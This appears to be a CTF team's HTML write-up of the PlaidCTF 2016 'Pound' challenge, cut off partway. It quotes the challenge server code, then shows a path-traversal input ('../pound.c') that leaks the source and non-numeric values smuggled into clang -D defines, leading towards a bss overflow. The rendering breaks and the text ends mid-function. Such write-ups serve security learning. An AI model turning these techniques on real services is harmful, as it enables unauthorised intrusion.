<!DOCTYPE html><html lang="en" data-astro-cid-dxom2xcl> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.16.18"><!-- Font preloads --><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://localhost:3000/writeups/2016-05-23-pound/"><!-- Primary Meta Tags --><title>PlaidCTF - Pound 290</title><meta name="title" content="PlaidCTF - Pound 290"><meta name="description" content="custom compiling, basic overflow in bss, got overwrite"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://localhost:3000/writeups/2016-05-23-pound/"><meta property="og:title" content="PlaidCTF - Pound 290"><meta property="og:description" content="custom compiling, basic overflow in bss, got overwrite"><meta property="og:image" content="https://localhost:3000/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://localhost:3000/writeups/2016-05-23-pound/"><meta property="twitter:title" content="PlaidCTF - Pound 290"><meta property="twitter:description" content="custom compiling, basic overflow in bss, got overwrite"><meta property="twitter:image" content="https://localhost:3000/blog-placeholder-1.jpg"><style>:root{--accent: #fea819;--accent-dark: #ac7010;--accent-dark-010: #ac70100a}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-regular.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-bold.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}body{font-family:Atkinson,sans-serif;margin:0;padding:0;text-align:left;background:#171717 no-repeat;background-size:100% 600px;word-wrap:break-word;overflow-wrap:break-word;color:#aaa;font-size:20px;line-height:1.25}main{width:720px;max-width:calc(100% - 2em);margin:auto;padding:3em 1em}h1,h2,h3,h4,h5,h6{margin:1em 0 .5rem;color:#fff;line-height:1.2}h1{font-size:3.052em}h2{font-size:2.441em}h3{font-size:1.953em}h4{font-size:1.563em}h5{font-size:1.25em}strong,b{font-weight:700}a,a:hover{color:var(--accent)}p{margin-bottom:1em}textarea{width:100%;font-size:16px}input{font-size:16px}table{width:100%}img{max-width:100%;height:auto;border-radius:8px}code{padding:0 .3em;background-color:#1f1f1f;border-radius:.2em;font-size:.8em}pre{padding:1em;border-radius:.2em}pre>code{all:unset;font-size:.8em}blockquote{border-left:4px solid var(--accent);padding:.01em 0 .01em 1em;margin:0;background-color:var(--accent-dark-010)}hr{border:none;border-top:1px solid #e9e9e9}@media (max-width: 720px){body{font-size:18px}main{padding:1em}}.sr-only{border:0;padding:0;margin:0;position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);clip-path:inset(50%);white-space:nowrap}table{border-collapse:collapse;text-align:center}tr{border:1px solid #e9e9e9}th,td{padding:.5em;text-align:center}th{background-color:#1f1f1f;color:#fff}td{background-color:#1b1b1b}a[data-astro-cid-eimmu3lg]{display:inline-block;text-decoration:none}a[data-astro-cid-eimmu3lg].active{font-weight:bolder;text-decoration:underline}header[data-astro-cid-3ef6ksr2]{margin:0;padding:0 1em;background:#1f1f1f;box-shadow:0 2px 8px rgba(var(--black),5%)}h2[data-astro-cid-3ef6ksr2]{margin:0;font-size:1em}h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2],h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none}nav[data-astro-cid-3ef6ksr2]{display:flex;align-items:center;justify-content:space-between}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{padding:1em .5em;color:var(--black);border-bottom:4px solid transparent;text-decoration:none}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none;border-bottom-color:var(--accent)}.social-links[data-astro-cid-3ef6ksr2],.social-links[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{display:flex}@media (max-width: 720px){.social-links[data-astro-cid-3ef6ksr2]{display:none}}footer[data-astro-cid-sz7xmlte]{padding:2em 1em 6em;background:linear-gradient(var(--gray-gradient)) no-repeat;color:rgb(var(--gray));text-align:center}.social-links[data-astro-cid-sz7xmlte]{display:flex;justify-content:center;gap:1em;margin-top:1em}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{text-decoration:none;color:rgb(var(--gray))}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:rgb(var(--gray-dark))}
@media (prefers-color-scheme: dark){.markdown-alert{--color-border-default: #30363d;--color-accent-fg: #58a6ff;--color-accent-emphasis: #1f6feb;--color-danger-fg: #f85149;--color-danger-emphasis: #da3633;--color-attention-fg: #d29922;--color-attention-emphasis: #9e6a03;--color-done-fg: #a371f7;--color-done-emphasis: #8957e5;--color-success-fg: #3fb950;--color-success-emphasis: #238636}}@media (prefers-color-scheme: light){.markdown-alert{--color-border-default: #d0d7de;--color-accent-fg: #0969da;--color-accent-emphasis: #0969da;--color-danger-fg: #d1242f;--color-danger-emphasis: #cf222e;--color-attention-fg: #9a6700;--color-attention-emphasis: #9a6700;--color-done-fg: #8250df;--color-done-emphasis: #8250df;--color-success-fg: #1a7f37;--color-success-emphasis: #1f883d}}.markdown-alert{border-left:.25em solid var(--borderColor-default, var(--color-border-default));color:inherit;margin-bottom:16px;padding:.5rem 1em}.markdown-alert>:last-child{margin-bottom:0!important}.markdown-alert .markdown-alert-title{align-items:center;display:flex;font-size:14px;font-weight:500;line-height:1}.markdown-alert .markdown-alert-title svg.octicon{margin-right:8px!important;margin-right:var(--base-size-8,8px)!important;fill:currentColor}.markdown-alert.markdown-alert-note{border-left-color:var(--borderColor-accent-emphasis,var(--color-accent-emphasis))}.markdown-alert.markdown-alert-note .markdown-alert-title{color:var(--color-accent-fg);color:var(--fgColor-accent,var(--color-accent-fg))}.markdown-alert.markdown-alert-tip{border-left-color:var(--borderColor-success-emphasis,var(--color-success-emphasis))}.markdown-alert.markdown-alert-tip .markdown-alert-title{color:var(--color-success-fg);color:var(--fgColor-success,var(--color-success-fg))}.markdown-alert.markdown-alert-important{border-left-color:var(--borderColor-done-emphasis,var(--color-done-emphasis))}.markdown-alert.markdown-alert-important .markdown-alert-title{color:var(--color-done-fg);color:var(--fgColor-done,var(--color-done-fg))}.markdown-alert.markdown-alert-warning{border-left-color:var(--borderColor-attention-emphasis,var(--color-attention-emphasis))}.markdown-alert.markdown-alert-warning .markdown-alert-title{color:var(--color-attention-fg);color:var(--fgColor-attention,var(--color-attention-fg))}.markdown-alert.markdown-alert-caution{border-left-color:var(--borderColor-danger-emphasis,var(--color-danger-emphasis))}.markdown-alert.markdown-alert-caution .markdown-alert-title{color:var(--color-danger-fg);color:var(--fgColor-danger,var(--color-danger-fg))}main[data-astro-cid-dxom2xcl]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-dxom2xcl]{width:100%}.hero-image[data-astro-cid-dxom2xcl] img[data-astro-cid-dxom2xcl]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-dxom2xcl]{width:75%;max-width:calc(100% - 2em);margin:auto;padding:1em;color:rgb(var(--gray-dark))}.title[data-astro-cid-dxom2xcl]{margin-bottom:1em;padding:1em 0;text-align:center;line-height:1}.title[data-astro-cid-dxom2xcl] h1[data-astro-cid-dxom2xcl]{margin:0 0 .5em}.date[data-astro-cid-dxom2xcl]{margin-bottom:.5em;color:rgb(var(--gray))}.last-updated-on[data-astro-cid-dxom2xcl]{font-style:italic}
</style></head> <body data-astro-cid-dxom2xcl> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <a href="/" style="padding: 1rem 0 0 0;" data-astro-cid-3ef6ksr2> <img src="/new_tower_logo.png" alt="Tower of Hanoi Logo" width="50rem" height="50rem" style="border-radius: 0;" data-astro-cid-3ef6ksr2> </a> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/blog" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blogposts </a>  <a href="/writeups" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Writeups </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  </div> <div class="social-links" data-astro-cid-3ef6ksr2> <a href="https://x.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-3ef6ksr2> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-3ef6ksr2></path> </svg> </a> </div> </nav> </header>  <main data-astro-cid-dxom2xcl> <article data-astro-cid-dxom2xcl> <div class="hero-image" data-astro-cid-dxom2xcl> <img width="720" height="360" src="/writeup_images/plaid-generic.png" alt="" data-astro-cid-dxom2xcl> </div> <div class="prose" data-astro-cid-dxom2xcl> <div class="title" data-astro-cid-dxom2xcl> <div class="date" data-astro-cid-dxom2xcl> <time datetime="2016-05-23T07:00:00.000Z"> May 23, 2016 </time>  </div> <h1 data-astro-cid-dxom2xcl>PlaidCTF - Pound 290</h1> <h3 data-astro-cid-dxom2xcl> by marcof + jinblack</h3> <hr data-astro-cid-dxom2xcl> </div>  <blockquote>
<p>Trump top tweets and money simulation machine! Do you have enough to build a wall???</p>
</blockquote>
<p>The only file provided is <a href="/writeup_files/pound/server.py">this</a> server script written in python listening for connections on port 9765. After a quick look we understand the script is accepting a pair of arguments used to compile a C source file and later forking in the fresh compiled binary. To download the source file the script also provides a handy <code>read_tweet()</code> function easily exploitable to our favour:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> read_tweet</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Read the top 20 tweets by Trump!</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Enter a number (1 - 20)</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">    tweet_number </span><span style="color:#666666">=</span><span style="color:#BD976A"> raw_input</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">    time</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sleep</span><span style="color:#666666">(</span><span style="color:#4C9A91">5</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    try</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        with</span><span style="color:#B8A965"> open</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">tweets/</span><span style="color:#C99076">{0}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">tweet_number</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#B8A965">            print</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">    except</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#B8A965">        print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Invalid input!</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#758575DD">#</span></span>
<span class="line"><span style="color:#758575DD">#</span></span>
<span class="line"><span style="color:#758575DD">#</span></span>
<span class="line"><span style="color:#758575DD"># later in the code we have:</span></span>
<span class="line"><span style="color:#DBD7CAEE">ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> subprocess</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">call</span><span style="color:#666666">([</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">clang</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-m32</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-DL1=</span><span style="color:#C99076">{}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input1</span><span style="color:#666666">),</span></span>
<span class="line"><span style="color:#C98A7D77">                        "</span><span style="color:#C98A7D">-DL2=</span><span style="color:#C99076">{}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input2</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">pound.c</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-o</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">                        sim_name</span><span style="color:#666666">])</span></span>
<span class="line"></span></code></pre>
<p>Pretty easy to see that asking for tweet <code>../pound.c</code> would end up in leaking the real challenge <a href="/writeup_files/pound/pound.c">source code</a>.</p>
<p>Lets give a look to the core function of the python script:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> run_sim</span><span style="color:#666666">():</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Trump's money simulator (that makes america great again) simulates two different sized states transfering money around, with the awesome Trump algorithm.</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#B8A965">    print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">The simulator takes in 2 inputs. Due to the awesomeness of the simulator, we can only limit the input to less than a thousand each...</span><span style="color:#C98A7D77">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    input1 </span><span style="color:#666666">=</span><span style="color:#BD976A"> raw_input</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">[Smaller] State 1 Size:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    input2 </span><span style="color:#666666">=</span><span style="color:#BD976A"> raw_input</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">[Larger] State 2 Size:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input1</span><span style="color:#666666">)</span><span style="color:#CB7676"> ></span><span style="color:#4C9A91"> 3</span><span style="color:#CB7676"> or</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input2</span><span style="color:#666666">)</span><span style="color:#CB7676"> ></span><span style="color:#4C9A91">3</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#B8A965">        print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Number has to be less than 1000</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#4D9375">        return</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    str_to_hash </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">[]</span><span style="color:#C99076">{0}</span><span style="color:#C98A7D">[]</span><span style="color:#C99076">{1}</span><span style="color:#C98A7D">##END</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">input2</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    sim_id </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> hashlib</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sha256</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">str_to_hash</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">hexdigest</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">    sim_name </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">sims/sim-</span><span style="color:#C99076">{0}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sim_id</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">path</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">isfile</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">sim_name</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#B8A965">        print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Sim compiled, running sim...</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#4D9375">    else</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#B8A965">        print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Compiling Sim</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">        ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> subprocess</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">call</span><span style="color:#666666">([</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">clang</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-m32</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-DL1=</span><span style="color:#C99076">{}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input1</span><span style="color:#666666">),</span></span>
<span class="line"><span style="color:#C98A7D77">                        "</span><span style="color:#C98A7D">-DL2=</span><span style="color:#C99076">{}</span><span style="color:#C98A7D77">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">input2</span><span style="color:#666666">),</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">pound.c</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-o</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">                        sim_name</span><span style="color:#666666">])</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> ret </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#B8A965">            print</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Compiler error!</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#4D9375">            return</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    os</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">execve</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/usr/bin/sudo</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#666666"> [</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/usr/bin/sudo</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-u</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">smalluser</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> sim_name</span><span style="color:#666666">],</span><span style="color:#666666"> {})</span></span>
<span class="line"></span></code></pre>
<p>This accepts two inputs with len &#x3C;= 3 in order to compile pound.c (using clang) loading them in L1 and L2. Here is key to notice the script doesn’t check whether the input is numerical or not.</p>
<p>Now we analyzed pound.c source code and checked how we could use this consideration to our advantege. Without getting into much detail the program sets up a structure called <code>global_s</code></p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#758575DD">//number of citizens state_1 and state_2</span></span>
<span class="line"><span style="color:#CB7676">const</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> l1_len </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> L1</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#CB7676">const</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> l2_len </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> L2</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> STATE_SIZE_LEN</span><span style="color:#4C9A91"> 512</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> global_s</span><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#CB7676">    int</span><span style="color:#BD976A"> s1_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">l1_len</span><span style="color:#666666">];</span><span style="color:#758575DD"> //array containing gold amount for state_1 citizens</span></span>
<span class="line"><span style="color:#CB7676">    int</span><span style="color:#BD976A"> s2_citizens</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">l2_len</span><span style="color:#666666">];</span><span style="color:#758575DD"> //array containing gold amount for state_2 citizens</span></span>
<span class="line"><span style="color:#CB7676">    char</span><span style="color:#BD976A"> s1_name</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">STATE_SIZE_LEN</span><span style="color:#666666">];</span><span style="color:#758575DD"> // Name of state 1</span></span>
<span class="line"><span style="color:#CB7676">    char</span><span style="color:#BD976A"> s2_name</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">STATE_SIZE_LEN</span><span style="color:#666666">];</span><span style="color:#758575DD"> // Name of state 2</span></span>
<span class="line"><span style="color:#CB7676">    char</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">announcement</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> announcement_length</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> secret</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">}</span><span style="color:#DBD7CAEE"> global</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">``` containig information about two foreign states and allows us to transfer citizens</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D"> gold by propagating it from the bottom to the top of the array (or viceversa) or randomly swapping it trough states (refer to source code). &#x3C;br></span></span>
<span class="line"><span style="color:#C98A7D">L1 and L2 are used to define the citizens</span><span style="color:#C98A7D77">'</span><span style="color:#DBD7CAEE"> number of each state and we can force the assignment of `l1_len` and `l2_len` in something like: `</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> l1_len </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 3</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">2</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE">`</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> `</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> l2_len </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><span style="color:#4C9A91">1</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE">`</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> `</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> l1_len </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 3</span><span style="color:#CB7676">*</span><span style="color:#4C9A91">2</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE">`</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> `</span><span style="color:#CB7676">const</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> l2_len </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 3</span><span style="color:#CB7676">%</span><span style="color:#4C9A91">2</span><span style="color:#666666">;</span><span style="color:#DBD7CAEE">` etc</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> just by passing this arguments to the python server. This doesn</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">t seem very usefull but let</span><span style="color:#C98A7D77">'</span><span style="color:#DBD7CAEE">s keep looking.. </span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">The `</span><span style="color:#80A665">propagate_backwar</span><span style="color:#666666">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> k</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE">` and `</span><span style="color:#80A665">propagate_forward</span><span style="color:#666666">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> k</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE">` functions are revealing:</span></span>
<span class="line"><span style="color:#DBD7CAEE">```c</span></span>
<span class="line"><span style="color:#CB7676">void</span><span style="color:#80A665"> propagate_forward</span><span style="color:#666666">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> k</span><span style="color:#666666">)</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#758575DD">    // Somewhere total_length will be used :), with some buffer or heap</span></span>
<span class="line"><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> length_diff </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> L2 </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> L1</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE">j</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">    </span></span>
